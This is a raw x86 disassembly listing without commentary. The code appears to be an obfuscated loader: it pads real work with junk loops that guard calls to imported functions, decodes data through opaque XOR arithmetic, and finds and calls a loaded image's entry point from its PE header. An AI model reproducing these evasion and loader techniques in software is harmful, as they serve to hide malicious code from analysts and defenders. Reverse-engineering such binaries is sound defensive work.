  414ef0:	mov    DWORD PTR [ecx],eax
  414ef2:	mov    eax,0x22d4
  414ef7:	mov    eax,ds:0x41c7bf
  414efc:	cmp    eax,0x301ac8f5
  414f01:	mov    DWORD PTR ds:0x43101c,0x2384
  414f0b:	jne    0x41508c
  414f11:	mov    eax,DWORD PTR [ebp-0x4]
  414f14:	mov    ecx,DWORD PTR ds:0x41c553
  414f1a:	mov    DWORD PTR ds:0x42f000,0x18
  414f24:	cmp    DWORD PTR ds:0x42f000,0x0
  414f2b:	je     0x414fa2
  414f31:	cmp    DWORD PTR ds:0x42f000,0x22
  414f38:	jne    0x414f4e
  414f3e:	push   0x42f000
  414f43:	push   0x13a3
  414f48:	call   DWORD PTR ds:0x42a02c
  414f4e:	mov    edx,DWORD PTR ds:0x42f000
  414f54:	dec    edx
  414f55:	mov    DWORD PTR ds:0x42f000,edx
  414f5b:	jmp    0x414f24
  414f60:	and    DWORD PTR ds:0x42f00c,0x0
  414f6a:	mov    edx,DWORD PTR ds:0x42f00c
  414f70:	inc    edx
  414f71:	mov    DWORD PTR ds:0x42f00c,edx
  414f77:	cmp    DWORD PTR ds:0x42f00c,0x24
  414f7e:	jne    0x414f8f
  414f84:	push   0x46ff
  414f89:	call   DWORD PTR ds:0x42a030
  414f8f:	cmp    DWORD PTR ds:0x42f00c,0x1d
  414f96:	jb     0x414f6a
  414f9c:	xor    DWORD PTR ds:0x43100c,ecx
  414fa2:	mov    ecx,DWORD PTR [ecx+0x198]
  414fa8:	or     DWORD PTR ds:0x43200c,0x4725
  414fb2:	xor    eax,esi
  414fb4:	add    DWORD PTR ds:0x42f01c,ecx
  414fba:	add    eax,edi
  414fbc:	mov    DWORD PTR [ecx],eax
  414fbe:	mov    DWORD PTR ds:0x431010,0x2ae5
  414fc8:	mov    eax,DWORD PTR [ebp-0x4]
  414fcb:	mov    DWORD PTR ds:0x42f014,0x19
  414fd5:	cmp    DWORD PTR ds:0x42f014,0x0
  414fdc:	je     0x415082
  414fe2:	cmp    DWORD PTR ds:0x42f014,0xb
  414fe9:	jne    0x414ffa
  414fef:	push   0x732e
  414ff4:	call   DWORD PTR ds:0x42a034
  414ffa:	cmp    DWORD PTR ds:0x42f014,0xc
  415001:	jne    0x415016
  415007:	xor    ecx,ecx
  415009:	or     ecx,DWORD PTR ds:0x42f014
  41500f:	dec    ecx
  415010:	mov    DWORD PTR ds:0x42f014,ecx
  415016:	xor    ecx,ecx
  415018:	or     ecx,DWORD PTR ds:0x42f014
  41501e:	dec    ecx
  41501f:	mov    DWORD PTR ds:0x42f014,ecx
  415025:	jmp    0x414fd5
  41502a:	and    DWORD PTR ds:0x430018,0x0
  415034:	xor    edx,edx
  415036:	or     edx,DWORD PTR ds:0x430018
  41503c:	inc    edx
  41503d:	mov    DWORD PTR ds:0x430018,edx
  415043:	cmp    DWORD PTR ds:0x430018,0xa
  41504a:	jne    0x41505b
  415050:	push   0x430018
  415055:	call   DWORD PTR ds:0x42a038
  41505b:	cmp    DWORD PTR ds:0x430018,0x9
  415062:	jne    0x415075
  415068:	mov    edx,DWORD PTR ds:0x430018
  41506e:	inc    edx
  41506f:	mov    DWORD PTR ds:0x430018,edx
  415075:	cmp    DWORD PTR ds:0x430018,0x1a
  41507c:	jb     0x415034
  415082:	xor    eax,esi
  415084:	add    eax,edi
  415086:	inc    edx
  415087:	mov    ds:0x41c7bf,eax
  41508c:	mov    DWORD PTR ds:0x42f01c,0x16
  415096:	cmp    DWORD PTR ds:0x42f01c,0x0
  41509d:	je     0x415115
  4150a3:	cmp    DWORD PTR ds:0x42f01c,0x1f
  4150aa:	jne    0x4150c3
  4150b0:	push   0x126d
  4150b5:	push   0x1212
  4150ba:	push   DWORD PTR [ebp-0x28]
  4150bd:	call   DWORD PTR ds:0x42a03c
  4150c3:	mov    edx,DWORD PTR ds:0x42f01c
  4150c9:	dec    edx
  4150ca:	mov    DWORD PTR ds:0x42f01c,edx
  4150d0:	jmp    0x415096
  4150d5:	and    DWORD PTR ds:0x430008,0x0
  4150df:	mov    ecx,DWORD PTR ds:0x430008
  4150e5:	inc    ecx
  4150e6:	mov    DWORD PTR ds:0x430008,ecx
  4150ec:	cmp    DWORD PTR ds:0x430008,0x20
  4150f3:	jne    0x415102
  4150f9:	push   DWORD PTR [ebp-0x18]
  4150fc:	call   DWORD PTR ds:0x42a040
  415102:	cmp    DWORD PTR ds:0x430008,0x15
  415109:	jb     0x4150df
  41510f:	add    DWORD PTR ds:0x42e004,edx
  415115:	mov    eax,ds:0x41c553
  41511a:	mov    eax,DWORD PTR [eax+0x18c]
  415120:	and    DWORD PTR ds:0x42f018,0x0
  41512a:	jmp    0x41513c
  41512f:	mov    ecx,DWORD PTR ds:0x42f018
  415135:	inc    ecx
  415136:	mov    DWORD PTR ds:0x42f018,ecx
  41513c:	cmp    DWORD PTR ds:0x42f018,0x17
  415143:	jae    0x41522c
  415149:	cmp    DWORD PTR ds:0x42f018,0x4
  415150:	jne    0x41516f
  415156:	push   DWORD PTR [ebp-0x20]
  415159:	push   0x44e8
  41515e:	push   DWORD PTR [ebp-0x14]
  415161:	push   DWORD PTR [ebp-0x1c]
  415164:	push   0x85ad
  415169:	call   DWORD PTR ds:0x42a044
  41516f:	cmp    DWORD PTR ds:0x42f018,0x3
  415176:	jne    0x415189
  41517c:	mov    ecx,DWORD PTR ds:0x42f018
  415182:	inc    ecx
  415183:	mov    DWORD PTR ds:0x42f018,ecx
  415189:	jmp    0x41512f
  41518e:	and    DWORD PTR ds:0x431010,0x0
  415198:	jmp    0x4151aa
  41519d:	mov    edx,DWORD PTR ds:0x431010
  4151a3:	inc    edx
  4151a4:	mov    DWORD PTR ds:0x431010,edx
  4151aa:	cmp    DWORD PTR ds:0x431010,0x12
  4151b1:	jae    0x41522c
  4151b7:	cmp    DWORD PTR ds:0x431010,0x13
  4151be:	jne    0x4151cd
  4151c4:	push   DWORD PTR [ebp-0x14]
  4151c7:	call   DWORD PTR ds:0x42a018
  4151cd:	jmp    0x41519d
  4151d2:	mov    DWORD PTR ds:0x42f01c,0x18
  4151dc:	cmp    DWORD PTR ds:0x42f01c,0x0
  4151e3:	je     0x41522c
  4151e9:	cmp    DWORD PTR ds:0x42f01c,0x1c
  4151f0:	jne    0x415214
  4151f6:	push   0x423947
  4151fb:	push   DWORD PTR [ebp-0x18]
  4151fe:	push   DWORD PTR [ebp-0x28]
  415201:	push   0x609e
  415206:	push   0x6a9f
  41520b:	push   DWORD PTR [ebp-0xc]
  41520e:	call   DWORD PTR ds:0x42a01c
  415214:	mov    edx,DWORD PTR ds:0x42f01c
  41521a:	dec    edx
  41521b:	mov    DWORD PTR ds:0x42f01c,edx
  415221:	jmp    0x4151dc
  415226:	or     DWORD PTR ds:0x42e020,ecx
  41522c:	mov    eax,DWORD PTR [eax]
  41522e:	and    edx,DWORD PTR ds:0x42e020
  415234:	mov    DWORD PTR [ebp-0x4c],eax
  415237:	add    DWORD PTR ds:0x42f014,ecx
  41523d:	mov    ecx,0xf89c85ba
  415242:	add    eax,DWORD PTR ds:0x431010
  415248:	mov    DWORD PTR [ebp-0x38],ecx
  41524b:	mov    DWORD PTR [ebp-0x38],ecx
  41524e:	mov    DWORD PTR [ebp-0x38],ecx
  415251:	mov    DWORD PTR [ebp-0x30],ebx
  415254:	neg    ebx
  415256:	mov    DWORD PTR [ebp-0x38],ecx
  415259:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  415260:	and    ebx,edx
  415262:	mov    eax,DWORD PTR [ebp-0x4]
  415265:	movzx  ebx,BYTE PTR ds:0x43101c
  41526c:	sub    DWORD PTR ds:0x430010,ebx
  415272:	mov    edx,DWORD PTR [ebp-0x8]
  415275:	mov    ebx,DWORD PTR [ebp-0x8]
  415278:	adc    DWORD PTR ds:0x42e01c,0x430010
  415282:	xor    ebx,esi
  415284:	xor    edx,esi
  415286:	mov    DWORD PTR ds:0x42e018,0xe87
  415290:	add    edx,ebx
  415292:	mov    ebx,DWORD PTR [ebp-0x8]
  415295:	and    DWORD PTR ds:0x42f00c,0x4085
  41529f:	xor    ebx,esi
  4152a1:	sub    DWORD PTR ds:0x42e00c,0x42f004
  4152ab:	xor    eax,esi
  4152ad:	sub    DWORD PTR ds:0x432014,0x10b0
  4152b7:	add    eax,edi
  4152b9:	mov    DWORD PTR ds:0x42e028,0x6ad
  4152c3:	lea    edx,[edx+ebx*1+0x97588b]
  4152ca:	mov    DWORD PTR [ebp-0x14],eax
  4152cd:	mov    ebx,0x175d
  4152d2:	mov    ebx,0x8a29a121
  4152d7:	cmp    eax,edx
  4152d9:	mov    DWORD PTR ds:0x43001c,0x6024
  4152e3:	ja     0x415516
  4152e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4152ec:	mov    edx,DWORD PTR ds:0x431008
  4152f2:	sbb    DWORD PTR ds:0x43201c,edx
  4152f8:	xor    ecx,esi
  4152fa:	inc    edx
  4152fb:	lea    ecx,[ecx+eax*1+0x3272d9]
  415302:	and    DWORD PTR ds:0x431008,edi
  415308:	mov    DWORD PTR [ebp-0x10],ecx
  41530b:	mov    ecx,DWORD PTR [ebp-0x30]
  41530e:	xor    edx,DWORD PTR ds:0x43200c
  415314:	xor    ecx,esi
  415316:	mov    DWORD PTR ds:0x430014,0x1c
  415320:	cmp    DWORD PTR ds:0x430014,0x0
  415327:	je     0x415360
  41532d:	cmp    DWORD PTR ds:0x430014,0x21
  415334:	jne    0x415348
  41533a:	push   0x423885
  41533f:	push   DWORD PTR [ebp-0x24]
  415342:	call   DWORD PTR ds:0x42a020
  415348:	mov    edx,DWORD PTR ds:0x430014
  41534e:	dec    edx
  41534f:	mov    DWORD PTR ds:0x430014,edx
  415355:	jmp    0x415320
  41535a:	sub    DWORD PTR ds:0x431004,edx
  415360:	lea    ecx,[ebp+ecx*1+0x3272e1]
  415367:	and    edx,DWORD PTR ds:0x430000
  41536d:	mov    DWORD PTR [ebp-0x38],ecx
  415370:	mov    edx,DWORD PTR ds:0x42399f
  415376:	mov    ecx,DWORD PTR ds:0x41c39b
  41537c:	sub    ecx,edx
  41537e:	sub    edx,DWORD PTR [edx+ecx*1]
  415381:	mov    ecx,DWORD PTR ds:0x41c553
  415387:	or     DWORD PTR ds:0x42e004,edi
  41538d:	mov    ecx,DWORD PTR [ecx+0x1bc]
  415393:	mov    DWORD PTR ds:0x42e01c,0x15
  41539d:	cmp    DWORD PTR ds:0x42e01c,0x0
  4153a4:	je     0x4153f6
  4153aa:	cmp    DWORD PTR ds:0x42e01c,0x7
  4153b1:	jne    0x4153ca
  4153b7:	push   0x7958
  4153bc:	push   0x42e01c
  4153c1:	push   DWORD PTR [ebp-0x14]
  4153c4:	call   DWORD PTR ds:0x42a024
  4153ca:	cmp    DWORD PTR ds:0x42e01c,0x8
  4153d1:	jne    0x4153e4
  4153d7:	mov    edx,DWORD PTR ds:0x42e01c
  4153dd:	dec    edx
  4153de:	mov    DWORD PTR ds:0x42e01c,edx
  4153e4:	mov    edx,DWORD PTR ds:0x42e01c
  4153ea:	dec    edx
  4153eb:	mov    DWORD PTR ds:0x42e01c,edx
  4153f1:	jmp    0x41539d
  4153f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b6
  4153fd:	mov    DWORD PTR [ebp-0x34],ecx
  415400:	mov    DWORD PTR [ebp-0x20],0xf89c85b9
  415407:	mov    ecx,DWORD PTR [ebp-0xc]
  41540a:	mov    edx,DWORD PTR [ebp-0x10]
  41540d:	xor    ecx,esi
  41540f:	add    ecx,edi
  415411:	cmp    ecx,edx
  415413:	je     0x4154e2
  415419:	mov    eax,DWORD PTR [ebp-0xc]
  41541c:	mov    ecx,DWORD PTR [ebp-0x10]
  41541f:	xor    edx,edx
  415421:	xor    eax,esi
  415423:	add    eax,edi
  415425:	add    ecx,0xfabdbef3
  41542b:	adc    edx,0xffffffff
  41542e:	xor    ecx,ebx
  415430:	xor    edx,0x0
  415433:	mov    DWORD PTR [ebp-0x68],ecx
  415436:	mov    DWORD PTR [ebp-0x64],edx
  415439:	xor    edx,edx
  41543b:	mov    ecx,eax
  41543d:	add    ecx,0xfabdbef3
  415443:	adc    edx,0xffffffff
  415446:	xor    ecx,ebx
  415448:	xor    edx,0x0
  41544b:	mov    DWORD PTR [ebp-0x24],eax
  41544e:	mov    DWORD PTR [ebp-0x74],edx
  415451:	cmp    ecx,DWORD PTR [ebp-0x68]
  415454:	jne    0x415465
  41545a:	mov    ecx,DWORD PTR [ebp-0x64]
  41545d:	cmp    edx,ecx
  41545f:	je     0x4154df
  415465:	mov    ecx,DWORD PTR [ebp-0xc]
  415468:	mov    edx,DWORD PTR [ebp-0x20]
  41546b:	xor    edx,esi
  41546d:	add    edx,edi
  41546f:	imul   edx,eax
  415472:	xor    ecx,esi
  415474:	add    ecx,eax
  415476:	mov    eax,DWORD PTR [ebp-0x34]
  415479:	mov    ebx,DWORD PTR [ebp-0x38]
  41547c:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272d9]
  415483:	mov    BYTE PTR [edx+eax*1],cl
  415486:	mov    eax,DWORD PTR [ebp-0x20]
  415489:	mov    ecx,DWORD PTR [ebp-0x24]
  41548c:	xor    eax,esi
  41548e:	lea    eax,[ecx+eax*1+0x3272d9]
  415495:	mov    ecx,DWORD PTR [ebp-0x10]
  415498:	xor    edx,edx
  41549a:	add    ecx,0xfabdbef3
  4154a0:	adc    edx,0xffffffff
  4154a3:	xor    edx,0x0
  4154a6:	mov    ebx,0x8a29a121
  4154ab:	xor    ecx,ebx
  4154ad:	mov    DWORD PTR [ebp-0x70],ecx
  4154b0:	mov    DWORD PTR [ebp-0x6c],edx
  4154b3:	xor    edx,edx
  4154b5:	mov    ecx,eax
  4154b7:	add    ecx,0xfabdbef3
  4154bd:	adc    edx,0xffffffff
  4154c0:	xor    ecx,ebx
  4154c2:	xor    edx,0x0
  4154c5:	mov    DWORD PTR [ebp-0x24],eax
  4154c8:	mov    DWORD PTR [ebp-0x7c],edx
  4154cb:	cmp    ecx,DWORD PTR [ebp-0x70]
  4154ce:	jne    0x415465
  4154d4:	mov    ecx,DWORD PTR [ebp-0x6c]
  4154d7:	cmp    edx,ecx
  4154d9:	jne    0x415465
  4154df:	mov    eax,DWORD PTR [ebp-0x14]
  4154e2:	mov    ecx,DWORD PTR [ebp-0x8]
  4154e5:	xor    ecx,esi
  4154e7:	lea    eax,[eax+ecx*1+0x3272d9]
  4154ee:	mov    ecx,DWORD PTR [ebp-0x8]
  4154f1:	mov    edx,DWORD PTR [ebp-0x8]
  4154f4:	xor    edx,esi
  4154f6:	xor    ecx,esi
  4154f8:	add    ecx,edx
  4154fa:	mov    edx,DWORD PTR [ebp-0x8]
  4154fd:	xor    edx,esi
  4154ff:	lea    ecx,[ecx+edx*1+0x97588b]
  415506:	mov    DWORD PTR [ebp-0x14],eax
  415509:	cmp    eax,ecx
  41550b:	jbe    0x4152e9
  415511:	mov    ecx,0xf89c85ba
  415516:	mov    eax,DWORD PTR [ebp+0xc]
  415519:	mov    ds:0x41c3d7,eax
  41551e:	mov    eax,DWORD PTR [ebp+0x10]
  415521:	mov    ds:0x41c62b,eax
  415526:	mov    eax,ds:0x41c3d7
  41552b:	mov    edx,DWORD PTR [ebp-0x3c]
  41552e:	sub    eax,edi
  415530:	xor    eax,esi
  415532:	mov    DWORD PTR [edx],eax
  415534:	mov    eax,DWORD PTR [ebp-0x18]
  415537:	cmp    eax,0xf89c85b6
  41553c:	jne    0x415567
  415542:	lea    eax,[ebp-0x28]
  415545:	mov    DWORD PTR [ebp-0x40],eax
  415548:	lea    eax,[ebp+0x4]
  41554b:	mov    DWORD PTR [ebp-0x28],eax
  41554e:	mov    eax,DWORD PTR [ebp-0x28]
  415551:	test   eax,eax
  415553:	je     0x41567f
  415559:	mov    eax,DWORD PTR [ebp-0x1c]
  41555c:	mov    eax,DWORD PTR [ebp-0x8]
  41555f:	lea    eax,[ebp-0x40]
  415562:	jmp    0x415676
  415567:	mov    eax,DWORD PTR [ebp-0x44]
  41556a:	cmp    eax,0xf89c85b9
  41556f:	je     0x4155cc
  415575:	mov    eax,DWORD PTR [ebp-0x4]
  415578:	mov    edx,DWORD PTR [ebp-0x48]
  41557b:	xor    eax,esi
  41557d:	add    eax,edi
  41557f:	cmp    eax,edx
  415581:	je     0x4155cc
  415587:	mov    eax,ds:0x41c553
  41558c:	mov    eax,DWORD PTR [eax+0x194]
  415592:	mov    ecx,DWORD PTR [eax]
  415594:	mov    eax,DWORD PTR [ecx+0x3c]
  415597:	push   DWORD PTR ds:0x41c62b
  41559d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4155a1:	push   DWORD PTR ds:0x41c3d7
  4155a7:	add    eax,ecx
  4155a9:	mov    ecx,DWORD PTR ds:0x41c553
  4155af:	mov    ecx,DWORD PTR [ecx+0x194]
  4155b5:	push   DWORD PTR [ecx]
  4155b7:	call   eax
  4155b9:	mov    ecx,DWORD PTR ds:0x41c553
  4155bf:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4155c5:	mov    DWORD PTR [ecx],eax
  4155c7:	jmp    0x41567f
  4155cc:	mov    eax,DWORD PTR [ebp-0x4]
  4155cf:	mov    edx,DWORD PTR [ebp-0x4c]
  4155d2:	xor    eax,esi
  4155d4:	add    eax,edi
  4155d6:	cmp    eax,edx
  4155d8:	jne    0x415635
  4155de:	mov    eax,DWORD PTR [ebp-0x4]
  4155e1:	mov    edx,DWORD PTR ds:0x41c553
  4155e7:	mov    edx,DWORD PTR [edx+0x198]
  4155ed:	xor    eax,esi
  4155ef:	add    eax,edi
  4155f1:	cmp    eax,DWORD PTR [edx]
  4155f3:	jne    0x415612
  4155f9:	mov    eax,DWORD PTR [ebp-0x4]
  4155fc:	push   0xf89c85b6
  415601:	xor    eax,esi
  415603:	add    eax,edi
  415605:	push   eax
  415606:	push   ecx
  415607:	push   DWORD PTR [ebp-0x8]
  41560a:	push   DWORD PTR [ebp-0x4]
  41560d:	call   0x4066e9
  415612:	push   DWORD PTR [ebp-0x8]
  415615:	push   DWORD PTR [ebp-0x4]
  415618:	call   0x40b421
  41561d:	mov    eax,DWORD PTR [ebp-0x4]
  415620:	xor    eax,esi
  415622:	add    eax,edi
  415624:	mov    ds:0x41c5d7,eax
  415629:	mov    eax,DWORD PTR [ebp-0x4]
  41562c:	xor    eax,esi
  41562e:	add    eax,edi
  415630:	mov    ds:0x41c5cf,eax
  415635:	lea    eax,[ebp-0x2c]
  415638:	mov    DWORD PTR [ebp-0x50],eax
  41563b:	lea    eax,[ebp+0x4]
  41563e:	mov    DWORD PTR [ebp-0x2c],eax
  415641:	mov    eax,DWORD PTR [ebp-0x2c]
  415644:	test   eax,eax
  415646:	je     0x41567f
  41564c:	mov    DWORD PTR [ebp-0x54],0xf152c21
  415653:	mov    DWORD PTR [ebp-0x58],0x712ed0c
  41565a:	mov    DWORD PTR [ebp-0x5c],0x373fc2e
  415661:	mov    DWORD PTR [ebp-0x60],0x72670a1e
  415668:	call   0x401000
  41566d:	mov    eax,DWORD PTR [ebp-0x1c]
  415670:	mov    eax,DWORD PTR [ebp-0x8]
  415673:	lea    eax,[ebp-0x50]
  415676:	push   eax
  415677:	push   DWORD PTR [ebp-0x4]
  41567a:	call   0x40638a
  41567f:	mov    eax,ds:0x41c553
  415684:	add    eax,0x1cc
  415689:	mov    DWORD PTR [ebp-0x38],eax
  41568c:	lea    eax,[ebp-0x1c]
  41568f:	mov    DWORD PTR [ebp+0xc],0xf89c85b6
  415696:	mov    DWORD PTR [ebp-0x3c],eax
  415699:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  4156a0:	mov    eax,DWORD PTR [ebp+0xc]
  4156a3:	xor    eax,esi
  4156a5:	mov    DWORD PTR [ebp+0x10],0x4
  4156ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4156af:	add    eax,edi
  4156b1:	cmp    eax,ecx
  4156b3:	je     0x415774
  4156b9:	mov    eax,DWORD PTR [ebp+0xc]
  4156bc:	mov    ecx,DWORD PTR [ebp+0x10]
  4156bf:	xor    edx,edx
  4156c1:	xor    eax,esi
  4156c3:	add    eax,edi
  4156c5:	add    ecx,0xfabdbef3
  4156cb:	adc    edx,0xffffffff
  4156ce:	xor    ecx,ebx
  4156d0:	xor    edx,0x0
  4156d3:	mov    DWORD PTR [ebp-0x70],ecx
  4156d6:	mov    DWORD PTR [ebp-0x6c],edx
  4156d9:	xor    edx,edx
  4156db:	mov    ecx,eax
  4156dd:	add    ecx,0xfabdbef3
  4156e3:	adc    edx,0xffffffff
  4156e6:	xor    ecx,ebx
  4156e8:	xor    edx,0x0
  4156eb:	mov    DWORD PTR [ebp-0x20],eax
  4156ee:	cmp    ecx,DWORD PTR [ebp-0x70]
  4156f1:	jne    0x415700
  4156f7:	cmp    edx,DWORD PTR [ebp-0x6c]
  4156fa:	je     0x415774
  415700:	mov    ecx,DWORD PTR [ebp+0xc]
  415703:	mov    edx,DWORD PTR [ebp-0x24]
  415706:	xor    edx,esi
  415708:	xor    ecx,esi
  41570a:	add    ecx,eax
  41570c:	add    edx,edi
  41570e:	imul   edx,eax
  415711:	mov    eax,DWORD PTR [ebp-0x3c]
  415714:	mov    ebx,DWORD PTR [ebp-0x38]
  415717:	mov    cl,BYTE PTR [ebx+ecx*1+0x3272d9]
  41571e:	mov    BYTE PTR [edx+eax*1],cl
  415721:	mov    eax,DWORD PTR [ebp-0x24]
  415724:	mov    ecx,DWORD PTR [ebp-0x20]
  415727:	mov    edx,DWORD PTR [ebp+0x10]
  41572a:	xor    eax,esi
  41572c:	lea    eax,[ecx+eax*1+0x3272d9]
  415733:	xor    ecx,ecx
  415735:	add    edx,0xfabdbef3
  41573b:	adc    ecx,0xffffffff
  41573e:	xor    ecx,0x0
  415741:	mov    DWORD PTR [ebp-0x7c],ecx
  415744:	xor    ebx,ebx
  415746:	xor    edx,0x8a29a121
  41574c:	mov    ecx,eax
  41574e:	add    ecx,0xfabdbef3
  415754:	adc    ebx,0xffffffff
  415757:	xor    ecx,0x8a29a121
  41575d:	xor    ebx,0x0
  415760:	mov    DWORD PTR [ebp-0x20],eax
  415763:	cmp    ecx,edx
  415765:	jne    0x415700
  41576b:	cmp    ebx,DWORD PTR [ebp-0x7c]
  41576e:	jne    0x415700
  415774:	mov    eax,DWORD PTR [ebp-0x1c]
  415777:	mov    eax,DWORD PTR [eax]
  415779:	pop    edi
  41577a:	pop    esi
  41577b:	pop    ebx
  41577c:	leave  
  41577d:	ret    0xc
  415780:	push   ebp
  415781:	mov    ebp,esp
  415783:	sub    esp,0xa4
  415789:	mov    ecx,DWORD PTR [ebp+0x8]
  41578c:	mov    eax,0x8a84
  415791:	sbb    DWORD PTR ds:0x42e01c,0x727
  41579b:	xor    ax,WORD PTR [ecx+0x20]
  41579f:	or     DWORD PTR ds:0x42e004,edx
  4157a5:	mov    ecx,0x3b4a
  4157aa:	add    ax,cx
  4157ad:	sub    ecx,DWORD PTR ds:0x42f014
  4157b3:	movzx  eax,ax
  4157b6:	mov    DWORD PTR [ebp-0x18],eax
  4157b9:	and    DWORD PTR ds:0x430010,0x0
  4157c3:	mov    ecx,DWORD PTR ds:0x430010
  4157c9:	inc    ecx
  4157ca:	mov    DWORD PTR ds:0x430010,ecx
  4157d0:	cmp    DWORD PTR ds:0x430010,0x19
  4157d7:	jne    0x4157e8
  4157dd:	push   0x423947
  4157e2:	call   DWORD PTR ds:0x42a028
  4157e8:	cmp    DWORD PTR ds:0x430010,0x16
  4157ef:	jb     0x4157c3
  4157f5:	mov    BYTE PTR [ebp-0x1],0x61
  4157f9:	lea    eax,[ebp-0x1]
  4157fc:	xor    DWORD PTR ds:0x432000,0x225
  415806:	mov    DWORD PTR [ebp-0x10],eax
  415809:	and    DWORD PTR ds:0x432014,0x0
  415813:	xor    ecx,ecx
  415815:	or     ecx,DWORD PTR ds:0x432014
  41581b:	inc    ecx
  41581c:	mov    DWORD PTR ds:0x432014,ecx
  415822:	cmp    DWORD PTR ds:0x432014,0x4
  415829:	jne    0x41583d
  41582f:	push   0x42e028
  415834:	push   DWORD PTR [ebp-0x10]
  415837:	call   DWORD PTR ds:0x42a02c
  41583d:	cmp    DWORD PTR ds:0x432014,0x3
  415844:	jne    0x415859
  41584a:	xor    ecx,ecx
  41584c:	add    ecx,DWORD PTR ds:0x432014
  415852:	inc    ecx
  415853:	mov    DWORD PTR ds:0x432014,ecx
  415859:	cmp    DWORD PTR ds:0x432014,0x15
  415860:	jb     0x415813
  415866:	and    DWORD PTR ds:0x430008,0x0
  415870:	jmp    0x415882
  415875:	mov    ecx,DWORD PTR ds:0x430008
  41587b:	inc    ecx
  41587c:	mov    DWORD PTR ds:0x430008,ecx
  415882:	cmp    DWORD PTR ds:0x430008,0x16
  415889:	jae    0x4158b0
  41588f:	cmp    DWORD PTR ds:0x430008,0x1b
  415896:	jne    0x4158a5
  41589c:	push   DWORD PTR [ebp-0x10]
  41589f:	call   DWORD PTR ds:0x42a030
  4158a5:	jmp    0x415875
  4158aa:	sbb    ecx,0x5efa
  4158b0:	mov    al,BYTE PTR [ebp-0x1]
  4158b3:	or     DWORD PTR ds:0x431004,0x7b40
  4158bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4158c0:	and    DWORD PTR ds:0x42e020,0x430014
  4158ca:	xor    al,0x6e
  4158cc:	sbb    DWORD PTR ds:0x43100c,0x431008
  4158d6:	sub    al,0xe
  4158d8:	sbb    DWORD PTR ds:0x430018,0x43200c
  4158e2:	mov    BYTE PTR [ecx],al
  4158e4:	dec    eax
  4158e5:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  4158ec:	neg    ecx
  4158ee:	push   ebx
  4158ef:	and    DWORD PTR ds:0x42e00c,0x0
  4158f9:	mov    eax,ds:0x42e00c
  4158fe:	inc    eax
  4158ff:	mov    ds:0x42e00c,eax
  415904:	cmp    DWORD PTR ds:0x42e00c,0xa
  41590b:	jne    0x41591c
  415911:	push   0x3c4d
  415916:	call   DWORD PTR ds:0x42a034
  41591c:	cmp    DWORD PTR ds:0x42e00c,0x9
  415923:	jne    0x415934
  415929:	mov    eax,ds:0x42e00c
  41592e:	inc    eax
  41592f:	mov    ds:0x42e00c,eax
  415934:	cmp    DWORD PTR ds:0x42e00c,0x17
  41593b:	jb     0x4158f9
  415941:	mov    DWORD PTR ds:0x432000,0x17
  41594b:	cmp    DWORD PTR ds:0x432000,0x0
  415952:	je     0x4159e4
  415958:	cmp    DWORD PTR ds:0x432000,0x26
  41595f:	jne    0x415970
  415965:	push   0x42e028
  41596a:	call   DWORD PTR ds:0x42a038
  415970:	mov    eax,ds:0x432000
  415975:	dec    eax
  415976:	mov    ds:0x432000,eax
  41597b:	jmp    0x41594b
  415980:	and    DWORD PTR ds:0x42e028,0x0
  41598a:	jmp    0x41599a
  41598f:	mov    eax,ds:0x42e028
  415994:	inc    eax
  415995:	mov    ds:0x42e028,eax
  41599a:	cmp    DWORD PTR ds:0x42e028,0x16
  4159a1:	jae    0x4159e4
  4159a7:	cmp    DWORD PTR ds:0x42e028,0xd
  4159ae:	jne    0x4159c5
  4159b4:	push   DWORD PTR [ebp-0x1c]
  4159b7:	push   0x6a89
  4159bc:	push   DWORD PTR [ebp-0x1c]
  4159bf:	call   DWORD PTR ds:0x42a03c
  4159c5:	cmp    DWORD PTR ds:0x42e028,0xc
  4159cc:	jne    0x4159dd
  4159d2:	mov    eax,ds:0x42e028
  4159d7:	inc    eax
  4159d8:	mov    ds:0x42e028,eax
  4159dd:	jmp    0x41598f
  4159e2:	not    eax
  4159e4:	mov    DWORD PTR [ebp-0x8],0xf89c85b9
  4159eb:	mov    ecx,DWORD PTR [ebp-0x14]
  4159ee:	mov    eax,ds:0x432000
  4159f3:	adc    eax,DWORD PTR ds:0x42f010
  4159f9:	mov    ds:0x432000,eax
  4159fe:	push   esi
  4159ff:	mov    eax,ds:0x41c35f
  415a04:	mov    eax,DWORD PTR [eax]
  415a06:	sub    DWORD PTR ds:0x42e008,eax
  415a0c:	mov    eax,0x7510891
  415a11:	add    esi,0x4a8a
  415a17:	xor    ecx,eax
  415a19:	mov    esi,0x3272d9
  415a1e:	add    DWORD PTR ds:0x42e014,0x42f00c
  415a28:	push   edi
  415a29:	add    ecx,esi
  415a2b:	mov    DWORD PTR ds:0x42f008,0xc47
  415a35:	jmp    0x415a59
  415a3a:	mov    dl,BYTE PTR [ebp-0x1]
  415a3d:	mov    DWORD PTR ds:0x42f00c,0x6458
  415a47:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  415a4e:	mov    DWORD PTR ds:0x431014,0x136a
  415a58:	inc    ecx
  415a59:	cmp    ecx,0x40
  415a5c:	mov    DWORD PTR ds:0x430008,0x157
  415a66:	jb     0x415a3a
  415a6c:	and    edx,0x79bc
  415a72:	mov    edx,DWORD PTR [ebp-0x14]
  415a75:	xor    edx,eax
  415a77:	add    edx,esi
  415a79:	jmp    0x415b39
  415a7e:	mov    edi,DWORD PTR [ebp+0x8]
  415a81:	and    DWORD PTR ds:0x43200c,0x0
  415a8b:	mov    ecx,DWORD PTR ds:0x43200c
  415a91:	inc    ecx
  415a92:	mov    DWORD PTR ds:0x43200c,ecx
  415a98:	cmp    DWORD PTR ds:0x43200c,0x4
  415a9f:	jne    0x415ab0
  415aa5:	push   0x841f
  415aaa:	call   DWORD PTR ds:0x42a040
  415ab0:	cmp    DWORD PTR ds:0x43200c,0x3
  415ab7:	jne    0x415acc
  415abd:	xor    ecx,ecx
  415abf:	xor    ecx,DWORD PTR ds:0x43200c
  415ac5:	inc    ecx
  415ac6:	mov    DWORD PTR ds:0x43200c,ecx
  415acc:	cmp    DWORD PTR ds:0x43200c,0x1f
